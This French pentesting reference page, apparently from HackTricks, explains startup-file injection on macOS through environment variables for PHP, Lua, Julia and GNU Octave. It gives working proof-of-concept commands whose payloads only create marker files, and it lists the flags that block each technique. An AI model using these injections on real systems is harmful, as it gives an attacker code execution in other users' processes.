# Injection de fichier de démarrage de l’interpréteur macOS

{{#include ../../../banners/hacktricks-training.md}}

Ces techniques propres à chaque environnement d’exécution utilisent des variables d’environnement héritées pour sélectionner une configuration de démarrage ou du code à exécuter avant le script prévu. Lua prend également en charge une variante utilisant du code en ligne.

## Configuration de démarrage PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` et `auto_prepend_file`

PHP CLI et CGI lisent leur configuration à chaque invocation. `PHPRC` peut sélectionner un fichier `php.ini` lisible par l’attaquant, tandis que `PHP_INI_SCAN_DIR` peut rediriger le répertoire où sont recherchés les fichiers `.ini` supplémentaires. La directive `auto_prepend_file` force PHP à analyser un fichier avant le script demandé ; cette combinaison permet donc l’exécution de code au démarrage.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Une autre possibilité est un répertoire contenant un fichier `.ini` :

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

L’option `-n` ignore `php.ini` ; un chemin `-c` explicite et de confiance a priorité sur `PHPRC`. À noter : un SAPI serveur de longue durée lit normalement sa configuration au démarrage du serveur web, tandis que CLI et CGI la lisent à chaque invocation.<sup>[[1]](#references)</sup>

## Code de démarrage Lua

### `LUA_INIT`

Avant de traiter les options de la ligne de commande ou le script cible, l’interpréteur Lua autonome exécute `LUA_INIT_<major>_<minor>` ou, si la variable versionnée est absente, `LUA_INIT`. Une valeur commençant par `@` désigne un fichier ; toute autre valeur est directement évaluée comme du code Lua. Cela permet une exécution au démarrage avec ou sans fichier.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Le nom exact, avec sa version, varie selon l’interpréteur, par exemple `LUA_INIT_5_4`. `lua -E` ignore toutes les variables d’environnement, y compris le code de démarrage et les chemins des modules Lua.

## Dépôt de démarrage Julia

### `JULIA_DEPOT_PATH` et `startup.jl`

Au démarrage, Julia exécute normalement `config/startup.jl` depuis son premier dépôt. `JULIA_DEPOT_PATH` contrôle la liste des dépôts ; en le faisant pointer vers une arborescence lisible par l’attaquant, on redirige le chargement automatique du fichier de démarrage.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Le séparateur final est utile si la victime a toujours besoin de ses packages habituels. `julia --startup-file=no` désactive ce fichier de démarrage. Effacez la variable avant le lancement, car elle contrôle également les registres de packages, les environnements, les caches et les emplacements de chargement du code.

## Fichiers de démarrage GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave exécute au démarrage plusieurs fichiers contenant des commandes Octave valides. `OCTAVE_SITE_INITFILE` remplace le fichier de démarrage global au site et `OCTAVE_VERSION_INITFILE` remplace celui propre à la version, ce qui permet à l’une ou l’autre variable de rediriger l’exécution automatique vers un fichier lisible par l’attaquant.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` ignore uniquement les fichiers utilisateur tels que `~/.octaverc` ; il ne bloque **pas** le remplacement par le fichier de site décrit ci-dessus. Utilisez `--no-site-file` pour les fichiers de site, ou `--norc` / `-f` pour désactiver tous les fichiers de démarrage.<sup>[[7]](#references)</sup>

## References

- [1] [Fichier de configuration PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Interpréteur autonome Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Interface de ligne de commande Julia : fichier de démarrage](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Variables d’environnement Julia : `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Fichiers de démarrage GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Options de ligne de commande GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
{{#include ../../../banners/hacktricks-training.md}}
